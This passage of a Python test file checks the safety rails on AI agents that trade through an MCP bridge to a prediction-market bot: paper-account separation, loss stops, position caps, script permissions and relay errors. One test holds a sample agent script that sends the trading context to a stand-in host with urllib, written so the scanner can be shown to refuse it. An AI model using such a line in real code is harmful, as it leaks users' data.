        if oid == "0xpart":
            return {"canceled": [oid]}
        raise tt.api.PolymarketAPIError(400, "order already matched")
    monkeypatch.setattr(tt.api, "cancel_order", _venue)

    out = json.loads(_text(_call("cancel_all_orders", {})))
    assert sorted(asked) == ["0xfilled", "0xpart"]
    assert out["liveCancelled"] == 1, out
    assert out["liveAlreadyFilled"] == 1 and out["liveFailed"] == 0
    assert out["ok"] is True
    with db.get_db() as conn:
        st = {r["order_id"]: r["status"] for r in conn.execute(
            "SELECT order_id, status FROM mcp_orders")}
    assert st["0xfilled"] != "cancelled", "a filled order was booked as cancelled"
    assert st["0xpart"] == "cancelled"


def test_pausing_is_always_allowed_and_arming_is_not(fresh, monkeypatch):
    svc, events = _fake_service(monkeypatch, mcp_live_trading_enabled=False,
                                enable_trading=True)
    res = _call("pause_all_engines", {})
    assert not res["isError"]
    assert svc.STATE.cfg["enable_trading"] is False
    assert events and events[-1][0] == "mcp:configPatch"

    res = _call("set_engines", {"engines": {"crypto15m": True}})
    assert res["isError"] and "OFF" in _text(res)
    assert not svc.STATE.cfg.get("crypto15m_enabled")

    res = _call("set_engines", {"engines": {"crypto15m": False}})
    assert not res["isError"]


# ────────────────────────────────────────────────────────────────────────
# Perps
# ────────────────────────────────────────────────────────────────────────


def test_scripts_need_their_own_switch(fresh, monkeypatch):
    _fake_service(monkeypatch, mcp_live_trading_enabled=True, mcp_scripts_enabled=False)
    res = _call("save_script", {"code": "def decide(ctx):\n    return None\n"})
    assert res["isError"] and "scripts" in _text(res).lower()
    res = _call("backtest_script", {"code": "def decide(ctx):\n    return None\n"})
    assert res["isError"]


def test_an_agent_script_with_a_critical_finding_is_refused(fresh, monkeypatch):
    svc, _ = _fake_service(monkeypatch, mcp_scripts_enabled=True)
    saved = []

    async def _save(p, **_k):
        saved.append(p)
        return {"script": {}}
    svc._h_script_save = _save
    evil = ("import urllib.request\n"
            "def decide(ctx):\n"
            "    urllib.request.urlopen('https://x.example/' + str(ctx))\n")
    res = _call("save_script", {"code": evil})
    assert res["isError"] and "critical" in _text(res)
    assert saved == []


# ────────────────────────────────────────────────────────────────────────
# The agent's paper account is its own.
# ────────────────────────────────────────────────────────────────────────


def _mock_book(monkeypatch):
    async def _market(cid, include_raw=False):
        m = {"conditionId": cid, "title": "T", "slug": "t", "category": "crypto",
             "status": "open", "resolvedOutcome": None,
             "closeTime": "2030-01-01T00:00:00Z", "probability": 49.0,
             "bid": 48.0, "ask": 50.0, "minOrderSize": 1.0,
             "_raw": {"orderPriceMinTickSize": 0.01, "minimumTradeQty": 1,
                      "status": "MARKET_STATUS_OPEN", "active": True, "closed": False,
                      "feeCoefficient": 0, "category": "crypto"}}
        return m if include_raw else {k: v for k, v in m.items() if k != "_raw"}

    async def _book(cid, side="yes"):
        lvl = [{"priceCents": 50.0, "size": 1000.0, "cumulative": 1000.0, "notionalUsd": 500.0}]
        return {"conditionId": cid, "asks": lvl, "bids": [
            {"priceCents": 48.0, "size": 1000.0, "cumulative": 1000.0, "notionalUsd": 480.0}],
            "bestAsk": 50.0, "bestBid": 48.0, "available": True, "note": None}

    async def _summaries(ids):
        return [await _market(i) for i in ids]

    async def _quotes(rows):
        return rows
    for mod in (tp.term, tt.term):
        monkeypatch.setattr(mod, "market", _market)
        monkeypatch.setattr(mod, "book", _book)
    monkeypatch.setattr(tp.term, "_summaries_for", _summaries)
    # The rows above already carry the quote; no second read is needed.
    monkeypatch.setattr(tp.term, "clob_quotes", _quotes)


def test_agent_paper_fills_land_in_its_own_book(fresh, monkeypatch):
    _fake_service(monkeypatch)
    _mock_book(monkeypatch)
    res = _call("place_order", {**_BUY, "mode": "paper", "orderType": "FAK",
                                "forecastId": _forecast()})
    assert not res["isError"], _text(res)

    with tp.using_book("ai"):
        ai = _run(tp.portfolio({"mcp_paper_bankroll_usd": 500.0}))
    mine = _run(tp.portfolio({"terminal_paper_bankroll_usd": 1000.0}))
    assert len(ai["positions"]) == 1 and ai["bankrollUsd"] == 500.0
    assert ai["positions"][0]["origin"] == "ai"
    assert mine["positions"] == [], "the agent's paper fill leaked into the user's account"
    assert mine["cashUsd"] == 1000.0


def test_an_agent_cannot_wipe_its_paper_record_or_its_loss_stop(fresh, monkeypatch):
    """The paper loss stop and the paper P&L the user judges an agent by are
    both rebuilt from the agent's paper orders. An agent (or Autopilot,
    unattended) that could reset its own account would erase both and buy
    again. Resetting it is the user's call (mcpPaper reset)."""
    _fake_service(monkeypatch, mcp_daily_loss_usd=3.0)
    _mock_book(monkeypatch)

    async def _lost(ids):
        return [{"conditionId": i, "title": "T", "status": "settled", "resolvedOutcome": "no",
                 "closeTime": "2030-01-01T00:00:00Z", "probability": 0.0}
                for i in ids]
    monkeypatch.setattr(tp.term, "_summaries_for", _lost)
    buy = {**_BUY, "mode": "paper", "orderType": "FAK"}
    assert not _call("place_order", {**buy, "forecastId": _forecast()})["isError"]
    # The market settled against the buy in the mock: $5 lost, over the $3 stop.
    res = _call("place_order", {**buy, "forecastId": _forecast()})
    assert res["isError"] and "Daily loss stop" in _text(res)

    reset = _call("reset_paper_account", {})
    with tp.using_book("ai"):
        assert len(tp.orders()["orders"]) == 1, "the agent wiped its own paper record"
    res = _call("place_order", {**buy, "forecastId": _forecast()})
    assert res["isError"] and "Daily loss stop" in _text(res), "a reset lifted the loss stop"
    assert reset["isError"]
    assert "reset_paper_account" not in {t["name"] for t in mcp_tools.list_tools()}


def test_the_users_reset_of_an_agent_paper_account_spares_the_users(fresh, monkeypatch):
    _fake_service(monkeypatch)
    _mock_book(monkeypatch)
    _run(tp.place({"conditionId": "0xme", "side": "yes", "action": "buy",
                   "priceCents": 50, "size": 4, "orderType": "FAK"}, {}))
    _call("place_order", {**_BUY, "mode": "paper", "orderType": "FAK",
                          "forecastId": _forecast()})
    with tp.using_book("ai"):     # what the user's mcpPaper {reset} does
        tp.reset()
        assert tp.orders()["orders"] == []
    assert len(tp.orders()["orders"]) == 1, "the user's paper order was wiped"


_REST = {**_BUY, "mode": "paper", "orderType": "GTC", "size": 60, "priceCents": 40}


def test_resting_paper_buys_count_toward_the_agents_own_caps(fresh, monkeypatch):
    """A resting buy is a position the agent can still get, as it is live:
    otherwise any number of them pass the caps and all fill later."""
    _fake_service(monkeypatch, mcp_agents=[{"id": "default", "rules": {
        "maxSharesPerMarket": 100, "maxOpenPositions": 1}}])
    _mock_book(monkeypatch)
    res = _call("place_order", {**_REST, "forecastId": _forecast()})
    assert not res["isError"] and "resting" in _text(res), _text(res)
    res = _call("place_order", {**_REST, "forecastId": _forecast()})
    assert res["isError"] and "at most 100 shares" in _text(res), _text(res)
    res = _call("place_order", {**_REST, "conditionId": "0xdef",
                                "forecastId": _forecast(cid="0xdef")})
    assert res["isError"] and "at most 1 open position" in _text(res), _text(res)


def test_resting_paper_buys_count_toward_the_shared_position_cap(fresh, monkeypatch):
    _fake_service(monkeypatch, mcp_max_positions=1)
    _mock_book(monkeypatch)
    assert not _call("place_order", {**_REST, "forecastId": _forecast()})["isError"]
    res = _call("place_order", {**_REST, "conditionId": "0xdef",
                                "forecastId": _forecast(cid="0xdef")})
    assert res["isError"] and "(cap 1)" in _text(res), _text(res)


def test_a_resting_paper_sell_frees_no_room_under_the_per_market_cap(fresh, monkeypatch):
    """Shares are held until a sell FILLS (live counts it the same way)."""
    _fake_service(monkeypatch, mcp_agents=[{"id": "default", "rules": {
        "maxSharesPerMarket": 60}}])
    _mock_book(monkeypatch)
    res = _call("place_order", {**_REST, "orderType": "FAK", "priceCents": 50,
                                "size": 40, "forecastId": _forecast()})
    assert not res["isError"], _text(res)
    res = _call("place_order", {**_REST, "action": "sell", "priceCents": 99, "size": 40})
    assert not res["isError"] and "resting" in _text(res), _text(res)
    res = _call("place_order", {**_REST, "size": 40, "forecastId": _forecast()})
    assert res["isError"] and "at most 60 shares" in _text(res), _text(res)


def test_an_agent_cannot_cancel_the_users_paper_order(fresh, monkeypatch):
    _fake_service(monkeypatch)
    _mock_book(monkeypatch)
    r = _run(tp.place({"conditionId": "0xme", "side": "yes", "action": "buy",
                       "priceCents": 10, "size": 4, "orderType": "GTC"}, {}))
    res = _call("cancel_order", {"mode": "paper", "localId": r["localId"]})
    assert res["isError"]
    assert tp.orders()["orders"][0]["status"] == "resting"


def test_an_agents_resting_buys_are_reserved_once_not_twice(fresh, monkeypatch):
    """The ticket's available cash is already net of resting buys. The agent
    rail used to subtract them itself; with both doing it, an agent was
    refused for being short by twice its reservation."""
    _fake_service(monkeypatch, mcp_paper_bankroll_usd=30.0)
    _mock_book(monkeypatch)
    fid = _forecast()
    # 50 @ 40c against a 50c ask rests and holds $20 of the $30.
    res = _call("place_order", {**_BUY, "mode": "paper", "orderType": "GTC",
                                "size": 50, "priceCents": 40, "forecastId": fid})
    assert not res["isError"], _text(res)
    # $12 is more than the $10 left free...
    res = _call("place_order", {**_BUY, "mode": "paper", "orderType": "GTC",
                                "size": 30, "priceCents": 40, "forecastId": fid})
    assert res["isError"] and "$10.00" in _text(res), _text(res)
    # ...$8 is not.
    res = _call("place_order", {**_BUY, "mode": "paper", "orderType": "GTC",
                                "size": 20, "priceCents": 40, "forecastId": fid})
    assert not res["isError"], _text(res)


def test_the_agent_can_sell_only_what_its_own_book_holds(fresh, monkeypatch):
    _fake_service(monkeypatch)
    _mock_book(monkeypatch)
    # The USER holds 10; the agent holds nothing.
    _run(tp.place({"conditionId": "0xabc", "side": "yes", "action": "buy",
                   "priceCents": 50, "size": 10, "orderType": "FAK"}, {}))
    res = _call("place_order", {**_BUY, "mode": "paper", "action": "sell",
                                "orderType": "FAK"})
    assert res["isError"] and "holds 0" in _text(res)


# ────────────────────────────────────────────────────────────────────────
# The stdio relay
# ────────────────────────────────────────────────────────────────────────


def test_relay_lists_tools_and_explains_itself_with_the_app_closed(fresh, monkeypatch):
    import mcp_stdio
    out = []
    monkeypatch.setattr(mcp_stdio, "_send", out.append)
    monkeypatch.setattr(mcp_stdio, "_endpoint", lambda: None)
    mcp_stdio._handle({"jsonrpc": "2.0", "id": 1, "method": "initialize",
                       "params": {"protocolVersion": "2025-06-18",
                                  "clientInfo": {"name": "Claude Desktop"}}})
    mcp_stdio._handle({"jsonrpc": "2.0", "id": 2, "method": "tools/list"})
    mcp_stdio._handle({"jsonrpc": "2.0", "id": 3, "method": "tools/call",
                       "params": {"name": "get_status", "arguments": {}}})
    assert out[0]["result"]["serverInfo"]["name"] == "krypt-polybot-us"
    assert out[0]["result"]["instructions"] == mcp_server.INSTRUCTIONS
    assert len(out[1]["result"]["tools"]) == len(mcp_tools.list_tools())
    assert out[2]["result"]["isError"] is True
    assert "not reachable" in out[2]["result"]["content"][0]["text"]


def test_relay_answers_a_modern_client_with_the_app_closed(fresh, monkeypatch):
    """A 2026-07-28 client probes with server/discover. Silence or a legacy
    error would send it back to the old handshake, or hide the server."""
    import mcp_stdio
    out = []
    monkeypatch.setattr(mcp_stdio, "_send", out.append)
    monkeypatch.setattr(mcp_stdio, "_endpoint", lambda: None)
    mcp_stdio._handle(_modern("server/discover"))
    r = out[-1]["result"]
    assert r["resultType"] == "complete" and MODERN in r["supportedVersions"]
    assert r["instructions"] == mcp_server.INSTRUCTIONS
    mcp_stdio._handle(_modern("server/discover", version="2099-01-01", rid=2))
    assert out[-1]["id"] == 2 and out[-1]["error"]["code"] == -32022
    mcp_stdio._handle(_modern("tools/list", rid=3))
    assert out[-1]["result"]["resultType"] == "complete" and "ttlMs" in out[-1]["result"]
    mcp_stdio._handle(_modern("tools/call", {"name": "get_status", "arguments": {}}, rid=4))
    r = out[-1]["result"]
    assert r["isError"] is True and r["resultType"] == "complete"
    assert "not reachable" in r["content"][0]["text"]


def test_relay_says_the_agent_is_gone_when_the_app_is_up_but_its_token_is_not(
        fresh, monkeypatch):
    """bridge.json is there (the app is, or was, serving) but this client's
    agent has no token: it was deleted, or the config names an agent that
    never existed. "Open the app" sends the user to fix the wrong thing."""
    import mcp_stdio
    out = []
    monkeypatch.setattr(mcp_stdio, "_send", out.append)
    monkeypatch.setattr(mcp_stdio, "_agent_id", "goneagent")
    bridge = fresh / "bridge.json"
    monkeypatch.setattr(mcp_server, "bridge_path", lambda: bridge)
    mcp_server.delete_token("goneagent")
    call = {"jsonrpc": "2.0", "id": 1, "method": "tools/call",
            "params": {"name": "get_status", "arguments": {}}}

    mcp_stdio._handle(call)
    assert "not reachable" in out[-1]["result"]["content"][0]["text"]

    bridge.write_text(json.dumps({"port": 1, "pid": 1}), encoding="utf-8")
    mcp_stdio._handle(call)
    text = out[-1]["result"]["content"][0]["text"]
    assert out[-1]["result"]["isError"] is True
    assert "no longer exists" in text and "AI Agents page" in text
    assert "not reachable" not in text


def test_relay_entry_point_is_branched_before_stdout_logging():
    """service.py mirrors every log record to stdout once logging is wired;
    on the relay, stdout is the protocol. The branch must come first."""
    from pathlib import Path
    src = (Path(__file__).resolve().parents[1] / "service.py").read_text(encoding="utf-8")
    assert src.index('"--mcp" in sys.argv') < src.index("\n_setup_logging()")


def test_service_is_one_module_when_run_as_a_script():
    """Run as a script, service.py is `__main__`. Every lazy `import service`
    (agent tools and rails, phone commands, the terminal's paper gate) must
    get THAT module, not a second copy with an empty STATE — in the running
    app the second copy answered a valid named agent's token with 401. The
    alias has to come before any engine module is imported."""
    from pathlib import Path
    src = (Path(__file__).resolve().parents[1] / "service.py").read_text(encoding="utf-8")
    alias = src.index('sys.modules.setdefault("service", sys.modules[__name__])')
    assert alias < src.index("\nimport trader")
    assert alias < src.index("\n_setup_logging()")


def test_autopilot_never_gets_the_scripts_permission(fresh, monkeypatch):
    # Autopilot runs unattended on text other people wrote.
    _fake_service(monkeypatch, mcp_scripts_enabled=True)
    s = dict(_session(), transport="autopilot", agent="default")
    for tool in ("backtest_script", "save_script"):
        res = _run(mcp_tools.call(tool, {"code": "def decide(ctx):\n    return None\n"}, s))
        assert res["isError"] and "autopilot" in _text(res).lower(), tool


def test_backtest_script_is_not_read_only_and_runs_isolated(fresh, monkeypatch):
    # It runs code the agent wrote: clients must ask, the audit log records
    # it, and the backend runs it in a child process without credentials.
    tools = {t["name"]: t for t in mcp_tools.list_tools()}
    assert tools["backtest_script"]["annotations"]["readOnlyHint"] is False
    svc, _ = _fake_service(monkeypatch, mcp_scripts_enabled=True)
    seen = []

    async def _bt(p, **_k):
        seen.append(p)
        return {"n": 0, "trades": []}
    svc._h_script_backtest = _bt
    audited = []
    monkeypatch.setattr(mcp_server, "audit", lambda *a, **k: audited.append(a))
    res = _call("backtest_script", {"code": "def decide(ctx):\n    return None\n"})
    assert not res["isError"], _text(res)
    assert seen and seen[0]["isolate"] is True
    assert any(a[1] == "backtest_script" for a in audited)


def _armed_script(sid="s1", *, live=True, notes="my notes"):
    with db.get_db() as conn:
        db.upsert_user_script(conn, {"id": sid, "name": "Mine", "description": "",
                                     "code": "def decide(ctx):\n    return None\n", "notes": notes})
        db.update_user_script(conn, sid, enabled=1, dry_run=0 if live else 1)


def _wire_save(svc, monkeypatch):
    saved, disarmed, pushed = [], [], []

    async def _save(p, **_k):
        saved.append(p)
        return {"script": {"id": p["id"]}}

    async def _dry(p, **_k):
        disarmed.append(p)
        return {"script": {}}
    svc._h_script_save = _save
    svc._h_script_set_dry_run = _dry
    monkeypatch.setattr(mcp_tools, "_push", lambda t: pushed.append(t))
    return saved, disarmed, pushed


NEW_CODE = "def decide(ctx):\n    return {'side': 'up', 'price': 'ask', 'size': 1}\n"


def test_an_agent_cannot_rewrite_an_armed_script_without_whole_account_powers(fresh, monkeypatch):
    svc, _ = _fake_service(monkeypatch, mcp_scripts_enabled=True, mcp_allow_live_switches=False)
    saved, disarmed, _ = _wire_save(svc, monkeypatch)
    _armed_script()
    res = _call("save_script", {"id": "s1", "code": NEW_CODE})
    assert res["isError"] and "whole-account" in _text(res).lower()
    assert saved == [] and disarmed == []


def test_rewriting_an_armed_script_puts_it_back_in_shadow_and_tells_the_user(fresh, monkeypatch):
    svc, _ = _fake_service(monkeypatch, mcp_scripts_enabled=True, mcp_allow_live_switches=True)
    saved, disarmed, pushed = _wire_save(svc, monkeypatch)
    _armed_script()
    res = _call("save_script", {"id": "s1", "code": NEW_CODE})
    assert not res["isError"], _text(res)
    assert disarmed == [{"id": "s1", "dryRun": True}]
    assert pushed and "SHADOW" in pushed[0]
    assert saved[0]["notes"] == "my notes"          # the user's notes survive


def test_a_shadow_script_can_be_rewritten_with_the_scripts_permission(fresh, monkeypatch):
    svc, _ = _fake_service(monkeypatch, mcp_scripts_enabled=True, mcp_allow_live_switches=False)
    saved, disarmed, pushed = _wire_save(svc, monkeypatch)
    _armed_script(live=False)
    res = _call("save_script", {"id": "s1", "code": NEW_CODE})
    assert not res["isError"], _text(res)
    assert saved and disarmed == [] and pushed == []
